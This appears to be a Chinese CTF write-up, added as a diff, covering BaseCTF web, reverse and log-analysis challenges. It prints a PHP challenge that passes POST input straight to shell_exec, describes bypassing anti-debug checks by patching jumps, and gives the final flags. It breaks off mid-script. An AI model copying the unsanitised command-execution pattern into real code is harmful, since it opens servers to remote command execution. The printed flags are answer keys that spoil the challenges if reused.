+<img src="image-34.png" alt="alt text"></p>
+<h2 id="week2-你听不到我的声音">[Week2] 你听不到我的声音</h2>
+<p>题目php源码如下</p>
+<pre><code class="language-php"> &lt;?php
+highlight_file(__FILE__);
+shell_exec($_POST['cmd']); 
+</code></pre>
+<p>只有shell_exec，没有回显，考虑将回显重定向到外部文件，然后直接访问这个文件即可
+<img src="image-35.png" alt="alt text"></p>
+<h1 id="reverse">Reverse</h1>
+<h2 id="fin-microgame">[Fin] microgame</h2>
+<p><a href="https://files.basectf.fun/d/basectf/Reverse/Fin/microgame.zip?sign=x5yKdNkqLB9oWrnMhhSJ-96FsSdSchLXEhhFMIgj56U=:0">题目附件</a>（不知道赛事结束后还能不能下）</p>
+<p>打开附件是一个基于Unity写的游戏，先别急着上IDA等各种高大上的工具，我们先打开试玩一下，发现只需要把所有敌人都消灭了就能拿到flag了（只有67个），Tab打开暂停界面能开无敌（invincibility。但是当你打完剩一只怪的时候，游戏会提示“只剩一只了”，按照小地图找，只能找到一处被地形围起来的密闭盒子，里面似乎就是最后一只怪。</p>
+<p>方法一：</p>
+<p>打开CE修改器，然后通过不断地跳，Tab暂停，落地，&hellip;把y轴坐标的地址找到，然后适当修改增加自己的y轴坐标，让自己落在那个盒子上方，再适当减少y轴坐标，就可以穿到那个盒子里面，看到最后的小怪了。</p>
+<p><img src="image-36.png" alt="alt text"></p>
+<p>方法二：</p>
+<p>开无敌之后，冲出初始房间，调整位置让小怪把你挤到那个盒子边，然后你就可以直接杀掉里面的小怪了。（如果清理完周边所有怪还是卡在墙里动不了，可以试试按C键下蹲爬出来）</p>
+<p><img src="image-37.png" alt="alt text"></p>
+<p><img src="image-38.png" alt="alt text"></p>
+<p>（嫌枪弹药少，清怪不够快，可以试试用CE修改器锁定弹药）</p>
+<h2 id="week3-dont-debug-me">[Week3] Dont-debug-me</h2>
+<p><a href="https://files.basectf.fun/d/basectf/Reverse/Week3/Dont-debug-me.zip?sign=nKneoFOReE3ZQtrYZctEvZ8lfi0hC5KDXFzVIRsgtQA=:0">题目附件</a></p>
+<p>打开附件，解压出来的exe文件打开就闪退，我们直接将其拖到IDA。</p>
+<p>在main流程里看到一个名字很奇怪的函数“ex1t”，过去看看定义，发现flag</p>
+<p><img src="image-39.png" alt="alt text"></p>
+<p>试了一下，是假flag，看起来必须让程序运行这句，才能拿到flag</p>
+<p>分析主流程，为了绕过两次Debug检测，只需要把那两处的汇编代码从“jz”改成“jnz”就行了</p>
+<p><img src="image-41.png" alt="alt text"></p>
+<p>记得在return那打断点，不然窗口一下子就没了</p>
+<p><img src="image-42.png" alt="alt text">
+<img src="image-40.png" alt="alt text"></p>
+<h2 id="week3-世界上最简单的题目">[Week3] 世界上最简单的题目</h2>
+<p>题目附件如下：</p>
+<pre><code class="language-python"># #免费的50分，复制粘贴直接秒杀！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
+# #免费的50分，复制粘贴直接秒杀！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
+# #免费的50分，复制粘贴直接秒杀！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
+# #免费的50分，复制粘贴直接秒杀！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
+# #免费的50分，复制粘贴直接秒杀！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
+a1 =[1 ,1 ,1 ,3 ,1 ,1 ,1 ,3 ,1 ,1 ,1 ,3 ,1 ,1 ,3 ,1 ,1 ,3 ,1 ,1 ,3 ,1 ,3 ,1 ,3 ,1 ,3 ]#line:6
+f1 =[101 ,102 ,117 ,120 ,119 ,108 ,102 ,124 ,100 ,109 ]#line:7
+def o1 ():#line:13
+# #免费的50分，复制粘贴直接秒杀！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
+# #免费的50分，复制粘贴直接秒杀！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
+# #免费的50分，复制粘贴直接秒杀！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
+# #免费的50分，复制粘贴直接秒杀！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
+# #免费的50分，复制粘贴直接秒杀！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
+    return input (&quot;please input your flag: &quot;)#line:14
+def p1 (O0O0OOOOO00OOOOO0 ):#line:20
+    return list (O0O0OOOOO00OOOOO0 )#line:21
+def main ():#line:27
+    OO0O0O00O00O00OO0 =o1 ()#line:28
+    O0OOOO0O0O0O0OOOO =1 #line:29
+    # #免费的50分，复制粘贴直接秒杀！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
+# #免费的50分，复制粘贴直接秒杀！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
+# #免费的50分，复制粘贴直接秒杀！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
+# #免费的50分，复制粘贴直接秒杀！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
+# #免费的50分，复制粘贴直接秒杀！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
+    O00OOO0OO0000OO00 =0 #line:30
+    if len (OO0O0O00O00O00OO0 )!=len (f1 ):#line:36
+        print (&quot;Input length does not match.&quot;)#line:37
+        exit ()#line:38
+    OOO00OOO0000OO0O0 =p1 (OO0O0O00O00O00OO0 )#line:44
+    # #免费的50分，复制粘贴直接秒杀！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
+# #免费的50分，复制粘贴直接秒杀！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
+# #免费的50分，复制粘贴直接秒杀！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
+# #免费的50分，复制粘贴直接秒杀！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
+# #免费的50分，复制粘贴直接秒杀！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
+    for O0O0OOO00O000000O in range (len (a1 )):#line:50
+        if a1 [O0O0OOO00O000000O ]==1 :#line:51
+            OOO00OOO0000OO0O0 [O00OOO0OO0000OO00 ]=chr (ord (OOO00OOO0000OO0O0 [O00OOO0OO0000OO00 ])^O0OOOO0O0O0O0OOOO )#line:57
+            O0OOOO0O0O0O0OOOO +=1 #line:58
+        elif a1 [O0O0OOO00O000000O ]==3 :#line:59
+            O00OOO0OO0000OO00 +=1 #line:60
+    for O0OOOOOO000000OOO in range (len (f1 )):#line:66
+        if f1 [O0OOOOOO000000OOO ]!=ord (OOO00OOO0000OO0O0 [O0OOOOOO000000OOO ]):#line:67
+            print (&quot;nooooo&quot;)#line:68
+            # #免费的50分，复制粘贴直接秒杀！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
+# #免费的50分，复制粘贴直接秒杀！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
+# #免费的50分，复制粘贴直接秒杀！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
+# #免费的50分，复制粘贴直接秒杀！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
+# #免费的50分，复制粘贴直接秒杀！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
+            exit ()#line:69
+    print (&quot;yes, your flag is&quot;)#line:75
+    print (&quot;BaseCTF{&quot;+''.join (OO0O0O00O00O00OO0 )+&quot;}&quot;)#line:76
+if __name__ ==&quot;__main__&quot;:#line:82
+    main ()#line:83
+</code></pre>
+<p>码风似乎有点过于抽象了，把注释全删掉，然后用字符串批量替换功能给那一团变量随便改几个具有区分度的名字，整理后如下：</p>
+<pre><code class="language-python">a1 =[1 ,1 ,1 ,3 ,1 ,1 ,1 ,3 ,1 ,1 ,1 ,3 ,1 ,1 ,3 ,1 ,1 ,3 ,1 ,1 ,3 ,1 ,3 ,1 ,3 ,1 ,3 ]#line:6
+f1 =[101 ,102 ,117 ,120 ,119 ,108 ,102 ,124 ,100 ,109 ]#line:7
+def o1 ():#line:13
+    return input (&quot;please input your flag: &quot;)#line:14
+def p1 (x):#line:20
+    return list (x)#line:21
+def main ():#line:27
+    a=o1 ()#line:28
+    i=1 #line:29
+    j=0 #line:30
+    if len (a)!=len (f1 ):#line:36
+        print (&quot;Input length does not match.&quot;)#line:37
+        exit ()#line:38
+    f=p1 (a)#用户输入字符串转list数组
+    for k in range (len (a1 )):#line:50
+        if a1 [k ]==1 :#line:51
+            f[j]=chr (ord (f[j])^i)#line:57
+            i+=1 #line:58
+        elif a1 [k ]==3 :#line:59
+            j+=1 #line:60
+    for k in range (len (f1 )):#line:66
+        if f1 [k ]!=ord (f[k ]):#line:67
+            print (&quot;nooooo&quot;)#line:68
+            exit ()#line:69
+    print (&quot;yes, your flag is&quot;)#line:75
+    print (&quot;BaseCTF{&quot;+''.join (a)+&quot;}&quot;)#line:76
+
+if __name__ ==&quot;__main__&quot;:#line:82
+    main ()#line:83
+</code></pre>
+<p>稍加分析可知，这是一个接受用户输入的字符串a，然后经过一段加密运算，加密成数组f1，并和数组f进行对比来判断用户的输入是否为flag。</p>
+<p>那么很容易就能根据加密过程写出解密脚本：</p>
+<pre><code class="language-python">a1 =[1 ,1 ,1 ,3 ,1 ,1 ,1 ,3 ,1 ,1 ,1 ,3 ,1 ,1 ,3 ,1 ,1 ,3 ,1 ,1 ,3 ,1 ,3 ,1 ,3 ,1 ,3 ]#line:6
+f1 =[101 ,102 ,117 ,120 ,119 ,108 ,102 ,124 ,100 ,109 ]#line:7
+
+def dec():
+    j = 9
+    i = 19
+
+    for k in range(len(f1)):
+        f1[k] = chr(f1[k])
+    
+    for k in range (len (a1 ) - 1, -1, -1):
+        if a1 [k ]==1 :
+            i-=1
+            f1[j]=chr (ord (f1[j])^i)
+        elif a1 [k ]==3 :
+            j-=1
+    flag = &quot;BaseCTF{&quot;
+    for s in f1:
+        flag += s
+    flag += &quot;}&quot;
+    print(flag)#BaseCTF{easyvmvmvm}
+
+if __name__ ==&quot;__main__&quot;:#line:82
+    dec()
+</code></pre>
+<h1 id="ppc">PPC</h1>
+<p>我也不知道PPC是什么</p>
+<h2 id="8号15点截止-basectf-崩啦---导言-week3-week4">[8号15点截止] BaseCTF 崩啦 - 导言 [Week3] [Week4]</h2>
+<p><a href="https://files.basectf.fun/d/basectf/Misc/Week3/BaseCTF%E5%B4%A9%E5%95%A6/oh-my-basectf.zip?sign=iq-ngk_xsHUSGtlRlUzIX9wb31gQbiV24KuvDs2_bc4=:0">题目附件</a></p>
+<p>打开附件就能看到flag
+<img src="image-43.png" alt="alt text"></p>
+<h2 id="8号15点截止-basectf-崩啦-ii---过期了-week3-week4">[8号15点截止] BaseCTF 崩啦 II - 过期了? [Week3] [Week4]</h2>
+<p>感觉这一系列的都是数据处理题，这题我一开始是直接手动一个个找的，数据量还算少，写出来了。但后面的题数据量都挺大，所以我又给这题重新写了个exp</p>
+<pre><code class="language-python">import json
+import hashlib
+def MD5(data):
+    md5 = hashlib.md5()  # 创建一个md5对象
+    md5.update(data.encode('utf-8'))  # 使用utf-8编码更新数据
+    return md5.hexdigest()  # 返回十六进制的哈希值
+
+with open(&quot;teams.json&quot;, &quot;r&quot;) as f:
+    teams = json.load(f)
+
+with open(&quot;flags.json&quot;, &quot;r&quot;) as f:
+    flags = json.load(f)
+
+with open(&quot;challenges.json&quot;, &quot;r&quot;) as f:
+    challenges = json.load(f)
+
+id2name = {}
+id2name_c = {}#从id到题目名映射
+
+FLAG = {}#队伍id，管理一堆map(题目名，对应正确flag)
+CHALLENGE = {}#键为题目名, 管理每道题题目id以及截至时间，得分
+TEAM = {}#flag找关联队伍
+
+for team in teams:#注册所有有效队伍
+    #if team[&quot;Name&quot;] in vaild:
+    #    print(&quot;怎么有队伍重名啊&quot;)#还真有一对重名的
+    #    print(team)
+    if team[&quot;Id&quot;] == &quot;235d4de0-51c6-7c03-7ab7-f509079f67d3&quot;:#特判一下那个重名队伍ID
+        team[&quot;Name&quot;] = &quot;#&quot; + team[&quot;Name&quot;]
+    id2name[team[&quot;Id&quot;]] = team[&quot;Name&quot;]
+    FLAG[team[&quot;Name&quot;]] = team
+    FLAG[team[&quot;Name&quot;]][&quot;flag&quot;] = {}
+    FLAG[team[&quot;Name&quot;]][&quot;score&quot;] = 0#注册初始分数
+
+for c in challenges:#challenge名字建立映射关系
+    id2name_c[c[&quot;Id&quot;]] = c[&quot;Name&quot;]
+    CHALLENGE[c[&quot;Name&quot;]] = c
+
+for flag in flags:#为每个队伍注册flag信息
+    teamName = id2name[flag[&quot;TeamId&quot;]]
+    cName = id2name_c[flag[&quot;ChallengeId&quot;]]
+    FLAG[teamName][&quot;flag&quot;][cName] = flag[&quot;Flag&quot;]
+    TEAM[flag[&quot;Flag&quot;]] = teamName
+
+import time as TiMe
+from datetime import datetime
+ 
+def str2time(s):
+    if s.find(&quot;T&quot;) != -1:#2024-08-31T15:00:00+08:00
+        return TiMe.strptime(s[:-6], &quot;%Y-%m-%dT%H:%M:%S&quot;)
+    else:#2024/8/31 20:19:41 +08:00
+        return TiMe.strptime(s[:-7], &quot;%Y/%m/%d %H:%M:%S&quot;)
+
+def mstr(s,st,ed):
+    s = s[s.find(st)+len(st):]
+    s = s[:s.find(ed)]
+    return s
+
+def getInfo(s):
+    if s.find(&quot;+08:00&quot;) == -1:
+        print(&quot;？？？你的时区发生啥事&quot;)
+    time = mstr(s, &quot;[&quot;, &quot; INF] &quot;)
+    team = mstr(s, &quot;] FlagChecker: 队伍 [&quot;, &quot;] 提交题目 &quot;)
+    flag = mstr(s, &quot;] 的答案 [&quot;, &quot;] &lt;&quot;)
+    submitter = mstr(s, &quot;] &lt;&quot;, &quot;&gt;&quot;)
+    challenge = mstr(s, &quot;] 提交题目 [&quot;, &quot;] 的答案 [&quot;)
+    return time, team, flag, submitter, challenge
+
+v = []
+with open(&quot;submissions.log&quot;, &quot;r&quot;, encoding = 'utf8') as f:
+    lines = f.readlines()
+    for line in lines:
+        time, teamName, flag, submitter, challengeName = getInfo(line)
+        if teamName != &quot;Damien Schroeder&quot;:
+            continue
+
+        if str2time(time) &gt; str2time(CHALLENGE[challengeName][&quot;EndAt&quot;]):
+            v.append([time, CHALLENGE[challengeName][&quot;Id&quot;]])
+
+v = sorted(v, key = lambda x : (x[0], x[1]))
+
+FLAG = &quot;&quot;
+for t, i in v:
+    FLAG += i + &quot;,&quot;
+
+print(&quot;BaseCTF{&quot; + MD5(FLAG[:-1]) + &quot;}&quot;)#BaseCTF{f577e4522ccba9ed07727212657f139e}
+</code></pre>
+<h2 id="8号15点截止-basectf-崩啦-iii---帮我查查队伍的解题-week3-week4">[8号15点截止] BaseCTF 崩啦 III - 帮我查查队伍的解题 [Week3] [Week4]</h2>
+<p>这题我一开始也是直接手动一个个找的。。。</p>
+<pre><code class="language-python">import json
+import hashlib
+def MD5(data):
+    md5 = hashlib.md5()  # 创建一个md5对象
+    md5.update(data.encode('utf-8'))  # 使用utf-8编码更新数据
+    return md5.hexdigest()  # 返回十六进制的哈希值
+
+with open(&quot;teams.json&quot;, &quot;r&quot;) as f:
+    teams = json.load(f)
+
+with open(&quot;flags.json&quot;, &quot;r&quot;) as f:
+    flags = json.load(f)
+
+with open(&quot;challenges.json&quot;, &quot;r&quot;) as f:
+    challenges = json.load(f)
+
+id2name = {}
+id2name_c = {}#从id到题目名映射
+
+FLAG = {}#队伍id，管理一堆map(题目名，对应正确flag)
+CHALLENGE = {}#键为题目名, 管理每道题题目id以及截至时间，得分
+TEAM = {}#flag找关联队伍
+
+for team in teams:#注册所有有效队伍
+    if team[&quot;Id&quot;] == &quot;235d4de0-51c6-7c03-7ab7-f509079f67d3&quot;:#特判一下那个重名队伍ID
+        team[&quot;Name&quot;] = &quot;#&quot; + team[&quot;Name&quot;]
+    id2name[team[&quot;Id&quot;]] = team[&quot;Name&quot;]
+    FLAG[team[&quot;Name&quot;]] = team
+    FLAG[team[&quot;Name&quot;]][&quot;flag&quot;] = {}
+    FLAG[team[&quot;Name&quot;]][&quot;score&quot;] = 0#注册初始分数
+
+challengesIdList = []#创建总Id表
+
+for c in challenges:#challenge名字建立映射关系
+    id2name_c[c[&quot;Id&quot;]] = c[&quot;Name&quot;]
+    CHALLENGE[c[&quot;Name&quot;]] = c
+    challengesIdList.append(c[&quot;Id&quot;])
+
+for flag in flags:#为每个队伍注册flag信息
+    teamName = id2name[flag[&quot;TeamId&quot;]]
+    cName = id2name_c[flag[&quot;ChallengeId&quot;]]
+    FLAG[teamName][&quot;flag&quot;][cName] = flag[&quot;Flag&quot;]
+    TEAM[flag[&quot;Flag&quot;]] = teamName
+
+import time as TiMe
+from datetime import datetime
+ 
+def str2time(s):
+    if s.find(&quot;T&quot;) != -1:#2024-08-31T15:00:00+08:00
+        return TiMe.strptime(s[:-6], &quot;%Y-%m-%dT%H:%M:%S&quot;)
+    else:#2024/8/31 20:19:41 +08:00
+        return TiMe.strptime(s[:-7], &quot;%Y/%m/%d %H:%M:%S&quot;)
+
+def mstr(s,st,ed):
+    s = s[s.find(st)+len(st):]
+    s = s[:s.find(ed)]
+    return s
+
+def getInfo(s):
+    if s.find(&quot;+08:00&quot;) == -1:
+        print(&quot;？？？你的时区发生啥事&quot;)
+    time = mstr(s, &quot;[&quot;, &quot; INF] &quot;)
+    team = mstr(s, &quot;] FlagChecker: 队伍 [&quot;, &quot;] 提交题目 &quot;)
+    flag = mstr(s, &quot;] 的答案 [&quot;, &quot;] &lt;&quot;)
+    submitter = mstr(s, &quot;] &lt;&quot;, &quot;&gt;&quot;)
+    challenge = mstr(s, &quot;] 提交题目 [&quot;, &quot;] 的答案 [&quot;)
+    return time, team, flag, submitter, challenge
+
+with open(&quot;submissions.log&quot;, &quot;r&quot;, encoding = 'utf8') as f:
+    lines = f.readlines()
+    for line in lines:
+        time, teamName, flag, submitter, challengeName = getInfo(line)
+        if teamName != &quot;Rick Hyatt&quot;:
+            continue
+        
+        if flag == FLAG[teamName][&quot;flag&quot;][challengeName] and str2time(time) &lt;= str2time(CHALLENGE[challengeName][&quot;EndAt&quot;]):
+            try:
+                challengesIdList.remove(CHALLENGE[challengeName][&quot;Id&quot;])
+            except:
+                pass
+
+FLAG = &quot;&quot;
+for i in challengesIdList:
+    FLAG += i + &quot;,&quot;
+print(&quot;BaseCTF{&quot; + MD5(FLAG[:-1]) + &quot;}&quot;)#BaseCTF{4f87919032dfc58a9a23044aab9acd99}
+</code></pre>
+<h2 id="8号15点截止-basectf-崩啦-iv---排排坐吃果果-week3-week4">[8号15点截止] BaseCTF 崩啦 IV - 排排坐吃果果 [Week3] [Week4]</h2>
+<p>这题开始，应该只能代码操作了，人工统计不太现实</p>
+<pre><code class="language-python">import json
+import hashlib
+
+def MD5(data):
+    md5 = hashlib.md5()  # 创建一个md5对象
+    md5.update(data.encode('utf-8'))  # 使用utf-8编码更新数据
+    return md5.hexdigest()  # 返回十六进制的哈希值
+
+with open(&quot;teams.json&quot;, &quot;r&quot;) as f:
+    teams = json.load(f)
+
+with open(&quot;flags.json&quot;, &quot;r&quot;) as f:
+    flags = json.load(f)
+
+with open(&quot;challenges.json&quot;, &quot;r&quot;) as f:
+    challenges = json.load(f)
+
+
+
+id2name = {}
+id2name_c = {}#从id到题目名映射
+
+FLAG = {}#队伍id，管理一堆map(题目名，对应正确flag)
+CHALLENGE = {}#键为题目名, 管理每道题题目id以及截至时间，得分
+TEAM = {}#flag找关联队伍
+
+for team in teams:#注册所有有效队伍
+    if team[&quot;Id&quot;] == &quot;235d4de0-51c6-7c03-7ab7-f509079f67d3&quot;:#特判一下
+        team[&quot;Name&quot;] = &quot;#&quot; + team[&quot;Name&quot;]
+    id2name[team[&quot;Id&quot;]] = team[&quot;Name&quot;]
+    FLAG[team[&quot;Name&quot;]] = team
+    FLAG[team[&quot;Name&quot;]][&quot;flag&quot;] = {}
+    FLAG[team[&quot;Name&quot;]][&quot;score&quot;] = 0#注册初始分数
+
+for c in challenges:#challenge名字建立映射关系
+    id2name_c[c[&quot;Id&quot;]] = c[&quot;Name&quot;]
+    CHALLENGE[c[&quot;Name&quot;]] = c
+
+for flag in flags:#为每个队伍注册flag信息
+    teamName = id2name[flag[&quot;TeamId&quot;]]
+    cName = id2name_c[flag[&quot;ChallengeId&quot;]]
+    FLAG[teamName][&quot;flag&quot;][cName] = flag[&quot;Flag&quot;]
+    TEAM[flag[&quot;Flag&quot;]] = teamName
+
+import time as TiMe
+from datetime import datetime
+ 
+def str2time(s):
+    if s.find(&quot;T&quot;) != -1:#2024-08-31T15:00:00+08:00
+        return TiMe.strptime(s[:-6], &quot;%Y-%m-%dT%H:%M:%S&quot;)
+    else:#2024/8/31 20:19:41 +08:00
+        return TiMe.strptime(s[:-7], &quot;%Y/%m/%d %H:%M:%S&quot;)
+
+def mstr(s,st,ed):
+    s = s[s.find(st)+len(st):]
+    s = s[:s.find(ed)]
+    return s
+def getInfo(s):
+    if s.find(&quot;+08:00&quot;) == -1:
+        print(&quot;？？？你的时区发生啥事&quot;)
+    time = mstr(s, &quot;[&quot;, &quot; INF] &quot;)
+    team = mstr(s, &quot;] FlagChecker: 队伍 [&quot;, &quot;] 提交题目 &quot;)
+    flag = mstr(s, &quot;] 的答案 [&quot;, &quot;] &lt;&quot;)
+    submitter = mstr(s, &quot;] &lt;&quot;, &quot;&gt;&quot;)
+    challenge = mstr(s, &quot;] 提交题目 [&quot;, &quot;] 的答案 [&quot;)
+    return time, team, flag, submitter, challenge
+
+with open(&quot;submissions.log&quot;, &quot;r&quot;, encoding = 'utf8') as f:
+    lines = f.readlines()
+    for line in lines:
+        time, teamName, flag, submitter, challengeName = getInfo(line)
+        if teamName == &quot;Terence Barrows&quot; and (submitter == &quot;Mercedes49&quot; or submitter == &quot;Albert.Considine&quot;):#特判
+            teamName = &quot;#&quot; + teamName
+
+        if challengeName in FLAG[teamName][&quot;flag&quot;] and FLAG[teamName][&quot;flag&quot;][challengeName] == flag and str2time(time) &lt;= str2time(CHALLENGE[challengeName][&quot;EndAt&quot;]):
+            FLAG[teamName][&quot;score&quot;] += CHALLENGE[challengeName][&quot;Points&quot;]
+            del FLAG[teamName][&quot;flag&quot;][challengeName]
+
+v = []
+for name in FLAG:
+    n = name
+    s = FLAG[name][&quot;score&quot;]
+    if n[0] == '#':
+        n = n[1:]
+
+    v.append([n, s])
+
+v = sorted(v, key = lambda x : (-x[1], x[0]))
+
+FLAG = &quot;&quot;
+for n, s in v:
+    FLAG += n + &quot;,&quot; + str(s) + &quot;;&quot;
+print(&quot;BaseCTF{&quot; + MD5(FLAG[:-1]) + &quot;}&quot;)#BaseCTF{d5b7e83b3a48a64c1c9af03f64b5f023}
+</code></pre>
+<h2 id="8号15点截止-basectf-崩啦-v---正义执行-week3-week4">[8号15点截止] BaseCTF 崩啦 V - 正义执行! [Week3] [Week4]</h2>
+<p>Terence Barrows罪大恶极，又抄别人flag，又和别人队伍名字取的一样</p>
+<pre><code class="language-python">import json
+import hashlib
+
+def MD5(data):
+    md5 = hashlib.md5()  # 创建一个md5对象
+    md5.update(data.encode('utf-8'))  # 使用utf-8编码更新数据
+    return md5.hexdigest()  # 返回十六进制的哈希值
+
+with open(&quot;teams.json&quot;, &quot;r&quot;) as f:
+    teams = json.load(f)
+
+with open(&quot;flags.json&quot;, &quot;r&quot;) as f:
+    flags = json.load(f)
+
+with open(&quot;challenges.json&quot;, &quot;r&quot;) as f:
+    challenges = json.load(f)
+
+id2name = {}
+id2name_c = {}
+
+FLAG = {}#队伍id，管理一堆map(题目名)
+CHALLENGE = {}#键为题目名
+TEAM = {}#flag找关联队伍
+
+vaild = set()#有效队伍
+allFlag = set()#flag池（假设不存在两两相同的flagin（
+print(len(teams))
+for team in teams:#注册所有有效队伍
+    if team[&quot;Id&quot;] == &quot;235d4de0-51c6-7c03-7ab7-f509079f67d3&quot;:#特判一下
+        team[&quot;Name&quot;] = &quot;#&quot; + team[&quot;Name&quot;]
+    vaild.add(team[&quot;Name&quot;])
+    id2name[team[&quot;Id&quot;]] = team[&quot;Name&quot;]
+    FLAG[team[&quot;Name&quot;]] = team
+    FLAG[team[&quot;Name&quot;]][&quot;flag&quot;] = {}
+
+for c in challenges:#challenge名字建立映射关系
+    id2name_c[c[&quot;Id&quot;]] = c[&quot;Name&quot;]
+    CHALLENGE[c[&quot;Name&quot;]] = c
+
+for flag in flags:#为每个队伍注册flag信息
+    teamName = id2name[flag[&quot;TeamId&quot;]]
+    cName = id2name_c[flag[&quot;ChallengeId&quot;]]
+    FLAG[teamName][&quot;flag&quot;][cName] = flag[&quot;Flag&quot;]
+    TEAM[flag[&quot;Flag&quot;]] = teamName
+    if flag[&quot;Flag&quot;] in allFlag:#保证flag都是独一无二的
+        print(&quot;假设错误&quot;)
+    allFlag.add(flag[&quot;Flag&quot;])
+
+def mstr(s,st,ed):
+    s = s[s.find(st)+len(st):]
+    s = s[:s.find(ed)]
+    return s
+def getInfo(s):
+    team = mstr(s, &quot;] FlagChecker: 队伍 [&quot;, &quot;] 提交题目 &quot;)
+    flag = mstr(s, &quot;] 的答案 [&quot;, &quot;] &lt;&quot;)
+    submitter = mstr(s, &quot;] &lt;&quot;, &quot;&gt;&quot;)
+    return team, flag, submitter
+
+print(&quot;本场报名队伍数：&quot; + str(len(vaild)))
+
+with open(&quot;submissions.log&quot;, &quot;r&quot;, encoding = 'utf8') as f:
+    lines = f.readlines()
+    for line in lines:
+        teamName, flag, submitter = getInfo(line)
+        if teamName == &quot;Terence Barrows&quot; and (submitter == &quot;Mercedes49&quot; or submitter == &quot;Albert.Considine&quot;):
+            teamName = &quot;#&quot; + teamName
+
+        if flag not in allFlag:
+            continue
+        steal = 1
+        for cName in FLAG[teamName][&quot;flag&quot;]:
+            flag_ = FLAG[teamName][&quot;flag&quot;][cName]
+            if flag_ == flag:
+                steal = 0
+                break
+
+        if steal == 1:
+            if teamName in vaild:
+                vaild.remove(teamName)
+            if TEAM[flag] in vaild:
+                vaild.remove(TEAM[flag])
+            if teamName == &quot;Terence Barrows&quot; or TEAM[flag] == &quot;Terence Barrows&quot; or teamName == &quot;#Terence Barrows&quot; or TEAM[flag] == &quot;#Terence Barrows&quot;:
+                print(teamName + &quot;提交的flag是&quot; + TEAM[flag] + &quot;的 ： &quot; + flag)
+
+print(&quot;本场有效队伍数：&quot; + str(len(vaild)))
+v = []
+for i in vaild:
+    if i[0] == '#':
+        i = i[1:]
+    v.append(i)
+
+v = sorted(v)
+FLAG = &quot;&quot;
+for i in v:
+    FLAG += i + &quot;,&quot;
+print(&quot;BaseCTF{&quot; + MD5(FLAG[:-1]) + &quot;}&quot;)#BaseCTF{716ab8b8782889047bf49f31eb553000}
+</code></pre>
+<p><img src="image-44.png" alt="alt text"></p>
+<h2 id="8号15点截止-basectf-崩啦-vi---流量检测-week3-week4">[8号15点截止] BaseCTF 崩啦 VI - 流量检测? [Week3] [Week4]</h2>
+<pre><code class="language-python">import json
+import hashlib
+
+def MD5(data):
+    md5 = hashlib.md5()  # 创建一个md5对象
+    md5.update(data.encode('utf-8'))  # 使用utf-8编码更新数据
+    return md5.hexdigest()  # 返回十六进制的哈希值
+
+with open(&quot;teams.json&quot;, &quot;r&quot;) as f:
+    teams = json.load(f)
+
+with open(&quot;flags.json&quot;, &quot;r&quot;) as f:
+    flags = json.load(f)
+
+with open(&quot;challenges.json&quot;, &quot;r&quot;) as f:
+    challenges = json.load(f)
+
+id2name = {}
+id2name_c = {}#从id到题目名映射
+
+FLAG = {}#队伍id，管理一堆map(题目名，对应正确flag)
+CHALLENGE = {}#键为题目名, 管理每道题题目id以及截至时间，得分
+TEAM = {}#flag找关联队伍
+
+for team in teams:#注册所有有效队伍
+    if team[&quot;Id&quot;] == &quot;235d4de0-51c6-7c03-7ab7-f509079f67d3&quot;:#特判一下
+        team[&quot;Name&quot;] = &quot;#&quot; + team[&quot;Name&quot;]
+    id2name[team[&quot;Id&quot;]] = team[&quot;Name&quot;]
+    FLAG[team[&quot;Name&quot;]] = team
+    FLAG[team[&quot;Name&quot;]][&quot;flag&quot;] = {}
+    FLAG[team[&quot;Name&quot;]][&quot;score&quot;] = 0#注册初始分数
+    FLAG[team[&quot;Name&quot;]][&quot;member&quot;] = {}#注册成员
+
+for c in challenges:#challenge名字建立映射关系
+    id2name_c[c[&quot;Id&quot;]] = c[&quot;Name&quot;]
+    CHALLENGE[c[&quot;Name&quot;]] = c
+
+for flag in flags:#为每个队伍注册flag信息
+    teamName = id2name[flag[&quot;TeamId&quot;]]
+    cName = id2name_c[flag[&quot;ChallengeId&quot;]]
+    FLAG[teamName][&quot;flag&quot;][cName] = flag[&quot;Flag&quot;]
+    TEAM[flag[&quot;Flag&quot;]] = teamName
+
+import time as TiMe
+from datetime import datetime
+ 
+def str2time(s):
+    if s.find(&quot;T&quot;) != -1:#2024-08-31T15:00:00+08:00
+        return TiMe.strptime(s[:-6], &quot;%Y-%m-%dT%H:%M:%S&quot;)
+    else:#2024/8/31 20:19:41 +08:00
+        return TiMe.strptime(s[:-7], &quot;%Y/%m/%d %H:%M:%S&quot;)
+
+def mstr(s,st,ed):
+    s = s[s.find(st)+len(st):]
+    s = s[:s.find(ed)]
+    return s
